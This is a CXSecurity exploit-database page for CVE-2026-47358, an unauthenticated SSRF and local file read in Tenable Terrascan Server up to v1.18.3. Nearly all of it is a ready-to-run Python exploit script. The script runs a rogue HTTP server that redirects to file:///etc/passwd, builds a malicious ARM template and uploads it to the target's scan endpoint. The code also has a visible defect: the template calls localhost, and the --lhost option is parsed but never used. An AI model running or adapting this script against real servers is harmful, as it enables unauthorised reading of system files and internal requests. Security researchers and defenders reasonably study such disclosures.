---
title: Tenable Terrascan Server < = v1.18.3 SSRF and Local File Read
url: https://cxsecurity.com/issue/WLB-2026060006
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-06-06
fetch_date: 2026-06-07T06:15:46.364932
---

# Tenable Terrascan Server < = v1.18.3 SSRF and Local File Read

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Tenable Terrascan Server <= v1.18.3 SSRF and Local File Read** **2026.06.06**  Credit:  **[Mohammed Idrees Banyamer](https://cxsecurity.com/author/Mohammed%2BIdrees%2BBanyamer/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2026-47358](https://cxsecurity.com/cveshow/CVE-2026-47358/ "Click to see CVE-2026-47358")**  CWE: **[CWE-73](https://cxsecurity.com/cwe/CWE-73 "Click to see CWE-73")** | |

#!/usr/bin/env python3
# Exploit Title: Tenable Terrascan Server <= v1.18.3 SSRF and Local File Read
# CVE: CVE-2026-47358
# Date: 2026-05-20
# Exploit Author: Mohammed Idrees Banyamer
# Author Country: Jordan
# Instagram: @banyamer\_security
# Author GitHub: https://github.com/mbanyamer
# Vendor Homepage: https://github.com/tenable/terrascan
# Software Link: https://github.com/tenable/terrascan
# Affected: Terrascan Server <= v1.18.3
# Tested on: Terrascan v1.18.3
# Category: Remote
# Platform: Linux
# Exploit Type: SSRF + Local File Read
# CVSS:
# CWE : CWE-918, CWE-73, CWE-610
# Description: Terrascan server allows unauthenticated SSRF and local file read via external URL resolution in IaC templates using go-getter.
# Fixed in: Unfixed (Project Archived)
# Usage: python3 exploit.py <target> --lhost <your\_ip> --lport <your\_port>
#
# Examples:
# python3 exploit.py http://127.0.0.1:9010 --lhost 192.168.1.100 --lport 8080
#
# Options:
#
# Notes:
#
# How to Use
#
# Step 1:
print(r"""
╔════════════════════════════════════════════════════════════════════════════════════════════╗
║ ║
║ ██████╗ █████╗ ███╗ ██╗██╗ ██╗ █████╗ ███╗ ███╗███████╗██████╗ ║
║ ██╔══██╗██╔══██╗████╗ ██║╚██╗ ██╔╝██╔══██╗████╗ ████║██╔════╝██╔══██╗ ║
║ ██████╔╝███████║██╔██╗ ██║ ╚████╔╝ ███████║██╔████╔██║█████╗ ██████╔╝ ║
║ ██╔══██╗██╔══██║██║╚██╗██║ ╚██╔╝ ██╔══██║██║╚██╔╝██║██╔══╝ ██╔══██╗ ║
║ ██████╔╝██║ ██║██║ ╚████║ ██║ ██║ ██║██║ ╚═╝ ██║███████╗██║ ██║ ║
║ ╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═══╝ ╚═╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚══════╝╚═╝ ╚═╝ ║
║ ║
║ [ b a n y a m e r \_ s e c u r i t y ] ║
║ ║
║ ▸ Silent Hunter | Shadow Presence | Digital Intel ◂ ║
║ ║
║ Operator : Mohammed Idrees Banyamer • Jordan 🇯🇴 ║
║ Handle : @banyamer\_security ║
║ ║
║ Exploit : CVE-2026-47358 ║
║ Target : Tenable Terrascan Server ║
║ ║
║ Status : ACTIVE ║
║ ║
╚════════════════════════════════════════════════════════════════════════════════════════════╝
""")
import requests
import json
import time
import argparse
import os
from http.server import HTTPServer, BaseHTTPRequestHandler
from threading import Thread
TARGET\_URL = None
ATTACKER\_HOST = "0.0.0.0"
ATTACKER\_PORT = None
class TerraformRedirectHandler(BaseHTTPRequestHandler):
def do\_GET(self):
if self.path.endswith("/payload"):
self.send\_response(200)
self.send\_header("X-Terraform-Get", "file:///etc/passwd")
self.end\_headers()
self.wfile.write(b"malicious redirect payload")
else:
self.send\_response(200)
self.end\_headers()
self.wfile.write(b"ok")
def start\_malicious\_server():
server = HTTPServer((ATTACKER\_HOST, ATTACKER\_PORT), TerraformRedirectHandler)
print(f"[\*] Malicious server listening on {ATTACKER\_HOST}:{ATTACKER\_PORT}")
server.serve\_forever()
def create\_malicious\_arm\_template():
template = {
"$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
"contentVersion": "1.0.0.0",
"resources": [],
"outputs": {
"poc": {
"type": "string",
"value": "CVE-2026-47358 PoC"
}
},
"templateLink": {
"uri": f"http://localhost:{ATTACKER\_PORT}/payload"
}
}
with open("malicious\_arm.json", "w") as f:
json.dump(template, f, indent=2)
print("[+] Malicious ARM template created")
def upload\_to\_terrascan(file\_path):
url = f"{TARGET\_URL}/v1/arm/1.0/azure/scan"
try:
with open(file\_path, "rb") as f:
files = {"file": (os.path.basename(file\_path), f, "application/json")}
response = requests.post(url, files=files, timeout=15)
print(f"[+] Upload status: {response.status\_code}")
except Exception as e:
print(f"[-] Upload error: {e}")
def main():
global TARGET\_URL, ATTACKER\_PORT
parser = argparse.ArgumentParser()
parser.add\_argument("target", help="Target Terrascan URL (e.g. http://127.0.0.1:9010)")
parser.add\_argument("--lhost", required=True, help="Your IP for callback")
parser.add\_argument("--lport", type=int, default=8080, help="Your listening port")
args = parser.parse\_args()
TARGET\_URL = args.target.rstrip("/")
ATTACKER\_PORT = args.lport
print("[\*] Starting malicious server...")
server\_thread = Thread(target=start\_malicious\_server, daemon=True)
server\_thread.start()
time.sleep(2)
create\_malicious\_arm\_template()
upload\_to\_terrascan("malicious\_arm.json")
print("[+] Exploit sent. Check your listener for SSRF activity.")
if \_\_name\_\_ == "\_\_main\_\_":
main()

**##### References:**

https://github.com/tenable/terrascan

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026060006)

[Tweet](https://twitter.com/share)

Vote for this issue:
 1
 0

100%

0%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2026**, cxsecurity.com

|  |

Back to Top